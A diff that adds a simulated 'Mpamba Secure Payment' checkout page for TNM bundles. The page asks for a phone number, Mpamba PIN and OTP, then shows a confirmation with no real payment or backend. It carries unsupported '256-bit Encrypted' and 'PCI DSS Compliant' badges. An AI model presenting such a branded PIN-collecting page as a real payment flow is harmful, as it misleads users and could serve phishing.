@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Mpamba Secure Payment</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --green: #00a651;
+      --green-deep: #073d25;
+      --green-soft: #ebfaf2;
+      --orange: #ff6600;
+      --orange-soft: #fff3ea;
+      --ink: #10251b;
+      --muted: #5f756b;
+      --line: #dfece4;
+      --paper: #f3faf6;
+      --white: #ffffff;
+      --shadow: rgba(8, 39, 25, 0.08);
+      --success: #0d8b59;
+    }
+
+    :root.dark {
+      --green: #2bd686;
+      --green-deep: #e9fff2;
+      --green-soft: rgba(43, 214, 134, 0.12);
+      --orange: #ff9a5b;
+      --orange-soft: rgba(255, 154, 91, 0.12);
+      --ink: #eefaf2;
+      --muted: #b6cabf;
+      --line: rgba(175, 206, 188, 0.18);
+      --paper: #0e1d17;
+      --white: #11241d;
+      --shadow: rgba(0, 0, 0, 0.28);
+      --success: #5fe1a0;
+    }
+
+    * { box-sizing: border-box; }
+
+    html, body {
+      margin: 0;
+      min-height: 100%;
+      background:
+        radial-gradient(circle at top left, rgba(19, 183, 113, 0.12), transparent 26%),
+        radial-gradient(circle at bottom right, rgba(255, 102, 0, 0.12), transparent 22%),
+        linear-gradient(180deg, #f4faf7 0%, #eefaf3 100%);
+      color: var(--ink);
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      padding: 18px;
+      transition: background 0.25s ease, color 0.25s ease;
+    }
+
+    :root.dark body {
+      background:
+        radial-gradient(circle at top left, rgba(43, 214, 134, 0.08), transparent 26%),
+        radial-gradient(circle at bottom right, rgba(255, 154, 91, 0.08), transparent 22%),
+        linear-gradient(180deg, #0a1713 0%, #0d1f1a 100%);
+      color: var(--ink);
+    }
+
+    .page {
+      width: min(100%, 430px);
+    }
+
+    .card {
+      background: linear-gradient(180deg, rgba(255,255,255,0.98), rgba(249,252,250,0.98));
+      border: 1px solid rgba(8, 61, 40, 0.08);
+      border-radius: 26px;
+      box-shadow: 0 26px 72px rgba(7, 61, 37, 0.14), inset 0 1px 0 rgba(255,255,255,0.8);
+      overflow: hidden;
+    }
+
+    :root.dark .card {
+      background: linear-gradient(180deg, rgba(16, 31, 25, 0.96), rgba(12, 22, 18, 0.96));
+      border-color: rgba(175, 206, 188, 0.16);
+      box-shadow: 0 26px 72px rgba(0, 0, 0, 0.28), inset 0 1px 0 rgba(255,255,255,0.03);
+    }
+
+    :root.dark .status-pill,
+    :root.dark .security-identity,
+    :root.dark .verification-strip,
+    :root.dark .trust-chip,
+    :root.dark .checkout-thumb,
+    :root.dark .amount-box,
+    :root.dark .phone-wrap,
+    :root.dark .country-prefix,
+    :root.dark .pin-row input {
+      border-color: rgba(148, 188, 166, 0.18);
+    }
+
+    :root.dark .security-identity,
+    :root.dark .verification-strip,
+    :root.dark .trust-chip,
+    :root.dark .checkout-thumb,
+    :root.dark .amount-box,
+    :root.dark .phone-wrap,
+    :root.dark .country-prefix,
+    :root.dark .pin-row input {
+      background: rgba(17, 34, 26, 0.9);
+      color: var(--ink);
+    }
+
+    :root.dark .invoice {
+      background: linear-gradient(180deg, rgba(16, 31, 25, 0.94), rgba(12, 22, 18, 0.94));
+      border-color: rgba(175, 206, 188, 0.16);
+      box-shadow: inset 0 1px rgba(255,255,255,0.03), 0 10px 26px rgba(0, 0, 0, 0.16);
+    }
+
+    :root.dark .thumb-art {
+      border-color: rgba(255,255,255,0.16);
+    }
+
+    :root.dark .line-items {
+      border-top-color: rgba(148, 188, 166, 0.18);
+    }
+
+    :root.dark .amount-box strong,
+    :root.dark .line-items > div span:last-child,
+    :root.dark .field label,
+    :root.dark .country-prefix,
+    :root.dark .success h2,
+    :root.dark h1,
+    :root.dark .thumb-text strong,
+    :root.dark .brand,
+    :root.dark .brand-powered span:last-child,
+    :root.dark .eyebrow,
+    :root.dark .subtle {
+      color: var(--ink);
+    }
+
+    :root.dark .amount-box {
+      background: rgba(17, 34, 26, 0.9);
+    }
+
+    :root.dark .field input {
+      color: var(--ink);
+      background: transparent;
+    }
+
+    :root.dark .phone-wrap:focus-within {
+      box-shadow: 0 0 0 4px rgba(39, 208, 126, 0.12);
+      border-color: rgba(39, 208, 126, 0.5);
+    }
+
+    :root.dark .ghost {
+      background: rgba(17, 34, 26, 0.9);
+      color: var(--ink);
+      border-color: rgba(148, 188, 166, 0.18);
+    }
+
+    :root.dark .success-badge {
+      background: rgba(43, 214, 134, 0.12);
+    }
+
+    :root.dark .success p,
+    :root.dark .line-items > div,
+    :root.dark .thumb-text span,
+    :root.dark .subtle,
+    :root.dark .field label,
+    :root.dark .country-prefix,
+    :root.dark .status-pill,
+    :root.dark .security-identity,
+    :root.dark .verification-strip,
+    :root.dark .trust-chip,
+    :root.dark .amount-box span {
+      color: var(--muted);
+    }
+
+    .topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 14px 18px;
+      background: rgba(255,255,255,0.86);
+      backdrop-filter: blur(14px);
+      border-bottom: 1px solid var(--line);
+    }
+
+    :root.dark .topbar,
+    :root.dark .card,
+    :root.dark .invoice,
+    :root.dark .field,
+    :root.dark .success,
+    :root.dark .ghost {
+      background: rgba(15, 33, 25, 0.96);
+      border-color: rgba(148, 188, 166, 0.2);
+      color: var(--ink);
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 0;
+      font-weight: 700;
+      color: var(--green-deep);
+    }
+
+    .brand-mark {
+      width: 76px;
+      height: 44px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2px 4px;
+      border-radius: 10px 0 0 10px;
+      background: #ffffff;
+      border: 1px solid rgba(7, 61, 37, 0.08);
+      border-right: none;
+      box-shadow: 0 6px 14px rgba(7, 61, 37, 0.04);
+    }
+
+    .brand-mark img {
+      display: block;
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+
+    .brand-powered {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      gap: 1px;
+      width: 92px;
+      height: 44px;
+      padding: 4px 10px 4px 12px;
+      border: 1px solid rgba(255,102,0,.48);
+      border-left: 0;
+      border-radius: 0 10px 10px 0;
+      background: linear-gradient(90deg, rgba(255,102,0,.09), transparent 72%);
+      line-height: 1.05;
+      box-shadow: inset 0 1px rgba(255,255,255,0.4);
+    }
+
+    .brand-powered span:first-child {
+      color: var(--orange);
+      font-size: 8px;
+      font-style: italic;
+      font-weight: 700;
+      letter-spacing: 1.1px;
+    }
+
+    .brand-powered span:last-child {
+      color: var(--ink);
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 13px;
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+
+    .status-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      padding: 8px 12px;
+      border-radius: 999px;
+      border: 1px solid rgba(0,166,81,.2);
+      background: linear-gradient(180deg, rgba(0,166,81,.1), rgba(0,166,81,.03));
+      color: var(--green-deep);
+      font-size: 10px;
+      font-weight: 800;
+      letter-spacing: 1.4px;
+      text-transform: uppercase;
+      box-shadow: inset 0 1px rgba(255,255,255,.55), 0 8px 18px rgba(0,166,81,.06);
+    }
+
+    .status-pill .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--green);
+      box-shadow: 0 0 0 4px rgba(0,166,81,.12);
+    }
+
+    .content {
+      padding: 18px 18px 20px;
+    }
+
+    .security-identity {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 0 0 14px;
+      padding: 10px 12px;
+      border: 1px solid rgba(0,166,81,.18);
+      border-radius: 12px;
+      background: linear-gradient(180deg, rgba(0,166,81,.07), rgba(0,166,81,.02));
+      color: var(--green-deep);
+      font-size: 12px;
+      font-weight: 700;
+      box-shadow: inset 0 1px rgba(255,255,255,.5), 0 8px 18px rgba(0,166,81,.05);
+    }
+
+    .security-identity .key {
+      width: 24px;
+      height: 24px;
+      display: grid;
+      place-items: center;
+      border-radius: 8px;
+      background: rgba(0,166,81,.12);
+      font-size: 12px;
+      box-shadow: inset 0 1px rgba(255,255,255,.38);
+    }
+
+    .verification-strip {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 8px;
+      margin: 12px 0 16px;
+      padding: 10px 12px;
+      border: 1px solid rgba(0,166,81,.18);
+      border-radius: 12px;
+      background: linear-gradient(180deg, rgba(0,166,81,.04), rgba(0,166,81,.01));
+      color: var(--green-deep);
+      font-size: 10px;
+      font-weight: 800;
+      letter-spacing: 1.3px;
+      text-transform: uppercase;
+      box-shadow: inset 0 1px rgba(255,255,255,.5);
+    }
+
+    .verification-strip .status {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      color: var(--green-deep);
+    }
+
+    .verification-strip .status .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--green);
+      box-shadow: 0 0 0 4px rgba(0,166,81,.13);
+    }
+
+    .trust-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin: 10px 0 18px;
+    }
+
+    .trust-chip {
+      position: relative;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 7px 10px 7px 28px;
+      border: 1px solid rgba(10, 79, 53, 0.12);
+      border-radius: 999px;
+      background: linear-gradient(135deg, rgba(0,166,81,0.08), rgba(255,255,255,0.96));
+      color: var(--green-deep);
+      font-size: 8.5px;
+      font-weight: 800;
+      letter-spacing: .6px;
+      text-transform: uppercase;
+      box-shadow: inset 0 1px rgba(255,255,255,.7), 0 8px 16px rgba(5, 57, 37, 0.04);
+      white-space: nowrap;
+    }
+
+    .trust-chip::before {
+      content: "";
+      position: absolute;
+      left: 8px;
+      top: 50%;
+      width: 14px;
+      height: 14px;
+      transform: translateY(-50%);
+      border-radius: 50%;
+      background: linear-gradient(135deg, rgba(0,166,81,.18), rgba(0,166,81,.08));
+      border: 1px solid rgba(0,166,81,.12);
+      box-shadow: inset 0 1px rgba(255,255,255,.7);
+    }
+
+    .trust-chip:nth-child(1)::before {
+      content: "✓";
+      display: grid;
+      place-items: center;
+      color: var(--green-deep);
+      font-size: 9px;
+      font-weight: 900;
+    }
+
+    .trust-chip:nth-child(2)::before {
+      content: "▣";
+      display: grid;
+      place-items: center;
+      color: var(--green-deep);
+      font-size: 9px;
+      font-weight: 900;
+    }
+
+    .trust-chip strong {
+      display: inline-block;
+      color: var(--green-deep);
+      font-size: 8.8px;
+      letter-spacing: .8px;
+    }
+
+    .invoice {
+      border: 1px solid #d9e8df;
+      border-radius: 22px;
+      background: linear-gradient(180deg, #f6faf7 0%, #edf8f1 100%);
+      padding: 18px;
+      box-shadow: inset 0 1px rgba(255,255,255,0.8), 0 10px 26px rgba(16, 37, 27, 0.04);
+    }
+
+    .checkout-thumb {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 12px 0 16px;
+      padding: 10px 12px;
+      border: 1px solid var(--line);
+      border-radius: 16px;
+      background: rgba(255,255,255,0.72);
+      box-shadow: inset 0 1px rgba(255,255,255,0.4);
+    }
+
+    .thumb-art {
+      width: 54px;
+      height: 54px;
+      border-radius: 14px;
+      overflow: hidden;
+      background: linear-gradient(135deg, #17b96e 0%, #0d8b59 100%);
+      display: grid;
+      place-items: center;
+      border: 1px solid rgba(255,255,255,0.32);
+      box-shadow: inset 0 2px rgba(255,255,255,0.25);
+    }
+
+    .thumb-art img {
+      display: block;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      background: white;
+    }
+
+    .thumb-text {
+      display: grid;
+      gap: 2px;
+      min-width: 0;
+    }
+
+    .thumb-text strong {
+      font-size: 14px;
+      letter-spacing: -0.2px;
+      color: var(--green-deep);
+    }
+
+    .thumb-text span {
+      font-size: 9.5px;
+      font-weight: 700;
+      letter-spacing: 1.4px;
+      text-transform: uppercase;
+      color: var(--muted);
+    }
+
+    .eyebrow {
+      font-size: 12px;
+      font-weight: 800;
+      letter-spacing: 1.8px;
+      text-transform: uppercase;
+      color: var(--green-deep);
+    }
+
+    h1 {
+      margin: 12px 0 8px;
+      font-size: 28px;
+      line-height: 1.1;
+      letter-spacing: -0.8px;
+      color: var(--green-deep);
+    }
+
+    .subtle {
+      color: var(--muted);
+      line-height: 1.6;
+      font-size: 13px;
+    }
+
+    .amount-box {
+      margin-top: 18px;
+      padding: 14px 16px;
+      border-radius: 14px;
+      background: rgba(255,255,255,0.86);
+      border: 1px solid var(--line);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      color: var(--green-deep);
+      font-weight: 700;
+      box-shadow: inset 0 1px rgba(255,255,255,0.5);
+    }
+
+    .amount-box strong {
+      color: var(--orange);
+      font-size: 22px;
+      letter-spacing: -0.5px;
+    }
+
+    .line-items {
+      margin-top: 16px;
+      padding-top: 12px;
+      border-top: 1px solid var(--line);
+      display: grid;
+      gap: 10px;
+    }
+
+    .line-items > div {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      color: var(--muted);
+      font-size: 12px;
+    }
+
+    .line-items > div span:last-child {
+      color: var(--ink);
+      font-weight: 700;
+    }
+
+    .field {
+      margin-top: 18px;
+    }
+
+    .field label {
+      display: block;
+      margin-bottom: 8px;
+      color: var(--muted);
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1.1px;
+    }
+
+    .phone-wrap {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      width: 100%;
+      border: 1px solid var(--line);
+      border-radius: 12px;
+      background: #fbfdfc;
+      padding: 0 12px 0 10px;
+      box-shadow: inset 0 1px rgba(0,0,0,0.02);
+    }
+
+    .country-prefix {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 8px 10px;
+      border-radius: 10px;
+      background: rgba(0,166,81,.08);
+      border: 1px solid rgba(0,166,81,.12);
+      color: var(--green-deep);
+      font-size: 13px;
+      font-weight: 800;
+      white-space: nowrap;
+    }
+
+    .field input {
+      flex: 1;
+      width: 100%;
+      border: none;
+      background: transparent;
+      color: var(--ink);
+      padding: 12px 0;
+      font-size: 15px;
+      outline: none;
+    }
+
+    .phone-wrap:focus-within {
+      border-color: rgba(0,166,81,.6);
+      box-shadow: 0 0 0 4px rgba(0,166,81,.08);
+    }
+
+    .pin-row {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 8px;
+    }
+
+    .pin-row input {
+      width: 46px;
+      height: 52px;
+      text-align: center;
+      font-size: 22px;
+      border: 1px solid var(--line);
+      border-radius: 12px;
+      background: #f9fbfa;
+      color: var(--ink);
+      box-shadow: inset 0 1px rgba(0,0,0,0.02);
+    }
+
+    .cta, .ghost {
+      width: 100%;
+      border: 0;
+      border-radius: 12px;
+      padding: 14px 16px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .cta {
+      margin-top: 18px;
+      background: linear-gradient(135deg, #00a651 0%, #0d8b59 100%);
+      color: white;
+      box-shadow: 0 12px 20px rgba(0,166,81,.22);
+    }
+
+    .cta:hover, .ghost:hover {
+      transform: translateY(-1px);
+    }
+
+    .cta:disabled {
+      opacity: 0.9;
+      cursor: wait;
+      transform: none;
+      box-shadow: 0 8px 16px rgba(0,166,81,.18);
+    }
+
+    .ghost {
+      margin-top: 10px;
+      background: white;
+      color: var(--green-deep);
+      border: 1px solid var(--line);
+    }
+
+    .processing-status {
+      display: none;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin: 12px 0 6px;
+      color: var(--green-deep);
+      font-size: 13px;
+      font-weight: 700;
+      letter-spacing: 0.3px;
+    }
+
+    .processing-status::before {
+      content: "";
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      border: 2px solid rgba(17, 108, 65, 0.2);
+      border-top-color: var(--green-deep);
+      animation: rotate-spinner 0.8s linear infinite;
+    }
+
+    @keyframes rotate-spinner {
+      to { transform: rotate(360deg); }
+    }
+
+    .otp-screen {
+      display: none;
+      text-align: center;
+      padding: 18px 12px 12px;
+    }
+
+    .otp-screen.active {
+      display: block;
+    }
+
+    .otp-box {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin: 18px 0 20px;
+    }
+
+    .otp-box input {
+      width: 42px;
+      height: 48px;
+      border-radius: 12px;
+      border: 1px solid var(--line);
+      background: #f8fbf9;
+      text-align: center;
+      font-size: 22px;
+      color: var(--ink);
+    }
+
+    .success {
+      display: none;
+      text-align: center;
+      padding: 18px 12px 12px;
+    }
+
+    .success.active {
+      display: block;
+    }
+
+    .success-badge {
+      width: 72px;
+      height: 72px;
+      margin: 0 auto 10px;
+      display: grid;
+      place-items: center;
+      border-radius: 50%;
+      background: rgba(0,166,81,.08);
+      color: var(--success);
+      font-size: 32px;
+    }
+
+    .success h2 {
+      margin: 0 0 8px;
+      color: var(--green-deep);
+      font-size: 28px;
+    }
+
+    .success p {
+      margin: 0;
+      color: var(--muted);
+      line-height: 1.6;
+    }
+
+    @media (max-width: 420px) {
+      body { padding: 12px; }
+      .page { width: min(100%, 100%); }
+      .topbar { padding: 14px 16px; }
+      .content { padding: 16px; }
+      .trust-row { grid-template-columns: 1fr; }
+      .pin-row { gap: 7px; }
+      .pin-row input { width: 42px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+    <div class="card">
+      <div class="topbar">
+        <div class="brand" aria-label="TNM and Mpamba brand">
+          <div class="brand-mark"><img src="assets/images/mpamba_logo_transparent.png" alt="Mpamba logo" /></div>
+          <div class="brand-powered"><span>POWERED BY</span><span>MPAMBA</span></div>
+        </div>
+      </div>
+
+      <div class="content">
+        <div class="security-identity"><span class="key">🔐</span>Encrypted identity • Verified Mpamba account</div>
+        <div id="payment-form">
+          <div class="invoice">
+            <div class="eyebrow" style="font-size:13px; color: var(--green-deep);">Pay with Mpamba</div>
+            <div class="checkout-thumb">
+              <div class="thumb-art">
+                <img src="assets/images/mpamba_logo_transparent.png" alt="Mpamba logo" />
+              </div>
+              <div class="thumb-text">
+                <strong id="thumb-title">Bundle</strong>
+                <span>TNM bundle</span>
+              </div>
+            </div>
+            <h1 id="bundle-name">Bundle</h1>
+            <div id="bundle-detail" class="subtle">Bundle details</div>
+
+            <div class="amount-box">
+              <span>Total due</span>
+              <strong id="bundle-price">MWK 0</strong>
+            </div>
+
+            <div class="line-items">
+              <div><span>Service</span><span id="service-item">TNM bundle</span></div>
+              <div><span>Validity</span><span id="validity">24 hours</span></div>
+              <div><span>Reference</span><span id="reference">TNM-2026</span></div>
+            </div>
+          </div>
+
+          <div id="topup-field" class="field" style="display:none;">
+            <label>Amount to add</label>
+            <div class="phone-wrap">
+              <span class="country-prefix" aria-label="Malawi amount">MWK</span>
+              <input id="topup-amount" type="number" min="100" step="100" value="10000" inputmode="numeric" aria-label="Amount to add" />
+            </div>
+          </div>
+
+          <div class="field">
+            <label>Mpamba phone number</label>
+            <div class="phone-wrap">
+              <span class="country-prefix" aria-label="Malawi country code">🇲🇼 +265</span>
+              <input id="recipient-number" type="tel" value="" inputmode="tel" aria-label="Mpamba phone number" placeholder="8********" />
+            </div>
+          </div>
+
+          <div class="field">
+            <label>Enter your PIN</label>
+            <div class="pin-row">
+              <input maxlength="1" inputmode="numeric" type="password" />
+              <input maxlength="1" inputmode="numeric" type="password" />
+              <input maxlength="1" inputmode="numeric" type="password" />
+              <input maxlength="1" inputmode="numeric" type="password" />
+            </div>
+          </div>
+
+          <div class="trust-row">
+            <div class="trust-chip"><strong>256-bit</strong>Encrypted</div>
+            <div class="trust-chip"><strong>PCI DSS</strong>Compliant</div>
+          </div>
+
+          <div id="auth-status" class="processing-status" style="display:none;">Authorizing...</div>
+          <button id="authorize-button" class="cta" type="button" style="font-size:16px; letter-spacing:0.2px;">Pay with Mpamba</button>
+          <button id="back-button" class="ghost" type="button">Back</button>
+        </div>
+
+        <div id="otp-screen" class="otp-screen">
+          <h2>Enter OTP</h2>
+          <p style="color: var(--muted); margin: 8px 0 18px;">A 6-digit code was sent to your registered Mpamba number.</p>
+          <div class="otp-box">
+            <input maxlength="1" inputmode="numeric" />
+            <input maxlength="1" inputmode="numeric" />
+            <input maxlength="1" inputmode="numeric" />
+            <input maxlength="1" inputmode="numeric" />
+            <input maxlength="1" inputmode="numeric" />
+            <input maxlength="1" inputmode="numeric" />
+          </div>
+          <button id="verify-otp" class="cta" type="button">Verify OTP</button>
+          <button id="otp-back" class="ghost" type="button">Back</button>
+        </div>
+
+        <div id="success" class="success">
+          <div class="success-badge">✓</div>
+          <h2>Payment confirmed</h2>
+          <p id="receipt-text">Your transaction is successful.</p>
+          <button id="done-button" class="cta" type="button">Done</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const root = document.documentElement;
+    const applyTheme = (darkMode) => {
+      root.classList.toggle('dark', darkMode);
+    };
+
+    const savedTheme = localStorage.getItem('themeMode') === 'dark';
+    applyTheme(savedTheme);
+
+    const money = n => 'MWK ' + Number(n).toLocaleString('en-US');
+    const normalizePhone = (value = '') => {
+      const clean = value.toString().replace(/\D/g, '');
+      if (!clean) return '888123456';
+      if (clean.startsWith('265')) return clean.slice(3);
+      if (clean.startsWith('0')) return clean.slice(1);
+      return clean;
+    };
+
+    const params = new URLSearchParams(window.location.search);
+    const transferNetwork = params.get('network') || '';
+    const transferRecipient = params.get('recipient') || '';
+    const transferMode = params.get('type') || '';
+    const rawName = params.get('name') || 'Bundle';
+    const rawDetail = params.get('detail') || 'Bundle details';
+    const price = Number(params.get('price') || 0);
+    const valid = params.get('valid') || '24 hours';
+    const phone = normalizePhone(params.get('phone') || transferRecipient || '0888123456');
+    const isTopUp = rawName === 'Add balance' || params.get('type') === 'topup';
+    const recipientInput = document.getElementById('recipient-number');
+    const maskPhoneHint = (value = '') => {
+      const digits = normalizePhone(value).replace(/\D/g, '');
+      if (!digits) return '8xxxxxxxx';
+      const visible = digits.charAt(0) || '8';
+      return visible + 'x'.repeat(Math.max(digits.length - 1, 8));
+    };
+
+    const name = transferMode === 'transfer' ? 'Send money' : rawName;
+    const detail = transferMode === 'transfer'
+      ? `Transfer to ${transferNetwork || 'Mpamba'} wallet • ${phone}`
+      : rawDetail;
+
+    const reference = `${name.replace(/\s+/g, '-').toUpperCase().slice(0, 16)}-${Date.now().toString().slice(-6)}`;
+    document.getElementById('bundle-name').textContent = name;
+    document.getElementById('thumb-title').textContent = name;
+    document.getElementById('bundle-detail').textContent = transferMode === 'transfer'
+      ? `${detail} • Valid immediately`
+      : `${detail} • Valid for ${valid}`;
+    document.getElementById('service-item').textContent = transferMode === 'transfer' ? `${transferNetwork || 'Mpamba'} transfer` : name;
+    document.getElementById('validity').textContent = transferMode === 'transfer' ? 'Instant' : valid;
+    document.getElementById('reference').textContent = reference;
+    recipientInput.dataset.actualValue = phone;
+    recipientInput.placeholder = '8xxxxxxxx';
+    recipientInput.value = '';
+    recipientInput.addEventListener('focus', () => {
+      if (!recipientInput.value) {
+        recipientInput.value = '';
+      }
+    });
+    recipientInput.addEventListener('blur', () => {
+      const actual = normalizePhone(recipientInput.value || recipientInput.dataset.actualValue || '');
+      recipientInput.dataset.actualValue = actual;
+      recipientInput.value = recipientInput.value ? actual : '';
+    });
+    recipientInput.addEventListener('input', () => {
+      const raw = (recipientInput.value || '').replace(/\D/g, '').slice(0, 9);
+      const actual = normalizePhone(raw);
+      recipientInput.dataset.actualValue = actual;
+      recipientInput.value = actual;
+    });
+
+    const topUpField = document.getElementById('topup-field');
+    const topUpAmountInput = document.getElementById('topup-amount');
+    if (isTopUp) {
+      topUpField.style.display = 'block';
+      topUpAmountInput.value = price || 10000;
+      document.getElementById('bundle-price').textContent = money(Number(topUpAmountInput.value) || 0);
+    } else {
+      document.getElementById('bundle-price').textContent = money(price);
+    }
+
+    const pinInputs = [...document.querySelectorAll('.pin-row input')];
+    const paymentForm = document.getElementById('payment-form');
+    const otpScreen = document.getElementById('otp-screen');
+    const success = document.getElementById('success');
+    const receiptText = document.getElementById('receipt-text');
+    const authStatus = document.getElementById('auth-status');
+    const authorizeButton = document.getElementById('authorize-button');
+    const otpInputs = [...document.querySelectorAll('.otp-box input')];
+
+    function collectPin() {
+      return pinInputs.map(input => input.value).join('');
+    }
+
+    function collectOtp() {
+      return otpInputs.map(input => input.value).join('');
+    }
+
+    function setAuthorizing(isLoading) {
+      authStatus.style.display = isLoading ? 'flex' : 'none';
+      authorizeButton.disabled = isLoading;
+      authorizeButton.textContent = isLoading ? 'Authorizing...' : 'Pay with Mpamba';
+    }
+
+    const getCurrentAmount = () => {
+      if (isTopUp && topUpAmountInput) {
+        const value = Number(topUpAmountInput.value);
+        return Number.isFinite(value) && value > 0 ? value : Number(price || 10000);
+      }
+      return Number(price || 0);
+    };
+
+    if (topUpAmountInput) {
+      topUpAmountInput.addEventListener('input', () => {
+        const amount = getCurrentAmount();
+        document.getElementById('bundle-price').textContent = money(amount);
+      });
+    }
+
+    authorizeButton.addEventListener('click', () => {
+      const recipientValue = recipientInput.dataset.actualValue || recipientInput.value || '';
+      const recipient = normalizePhone(recipientValue.trim());
+      const pin = collectPin();
+      const amount = getCurrentAmount();
+
+      if (!/^(88|31|89|99)\d{7}$/.test(recipient) || recipient.length > 9) {
+        alert('Enter a valid TNM number');
+        return;
+      }
+
+      if (!/^\d{4}$/.test(pin)) {
+        alert('Enter your 4-digit Mpamba PIN');
+        return;
+      }
+
+      if (isTopUp && amount <= 0) {
+        alert('Enter a valid amount to add');
+        return;
+      }
+
+      setAuthorizing(true);
+
+      setTimeout(() => {
+        const history = JSON.parse(localStorage.getItem('tnmHistory') || '[]');
+        history.unshift({ item: isTopUp ? 'Add balance' : name, amount, phone: recipient, date: new Date().toLocaleString() });
+        localStorage.setItem('tnmHistory', JSON.stringify(history));
+
+        setAuthorizing(false);
+        paymentForm.style.display = 'none';
+        otpScreen.classList.add('active');
+      }, 1200);
+    });
+
+    document.getElementById('verify-otp').addEventListener('click', () => {
+      const otp = collectOtp();
+      if (!/^\d{6}$/.test(otp)) {
+        alert('Enter the 6-digit OTP');
+        return;
+      }
+
+      const amount = getCurrentAmount();
+      const recipientValue = recipientInput.dataset.actualValue || recipientInput.value || '';
+      if (isTopUp) {
+        const storedBalance = Number(localStorage.getItem('tnmBalance') || 50000);
+        localStorage.setItem('tnmBalance', String(storedBalance + amount));
+      }
+
+      otpScreen.classList.remove('active');
+      success.classList.add('active');
+      receiptText.textContent = `${name} • ${money(amount)} • ${normalizePhone(recipientValue.trim())}`;
+    });
+
+    document.getElementById('otp-back').addEventListener('click', () => {
+      otpScreen.classList.remove('active');
+      paymentForm.style.display = 'block';
+    });
+
+    document.getElementById('back-button').addEventListener('click', () => {
+      window.location.href = 'index.html';
+    });
+
+    document.getElementById('done-button').addEventListener('click', () => {
+      window.location.href = 'index.html';
+    });
+
+    pinInputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        input.value = input.value.replace(/\D/g, '').slice(0, 1);
+        if (input.value && index < pinInputs.length - 1) {
+          pinInputs[index + 1].focus();
+        }
+      });
+
+      input.addEventListener('keydown', (event) => {
+        if (event.key === 'Backspace' && !input.value && index > 0) {
+          pinInputs[index - 1].focus();
+        }
+      });
+    });
+
+    otpInputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        input.value = input.value.replace(/\D/g, '').slice(0, 1);
+        if (input.value && index < otpInputs.length - 1) {
+          otpInputs[index + 1].focus();
+        }
+      });
+
+      input.addEventListener('keydown', (event) => {
+        if (event.key === 'Backspace' && !input.value && index > 0) {
+          otpInputs[index - 1].focus();
+        }
+      });
+    });
+  </script>
+</body>
+</html>
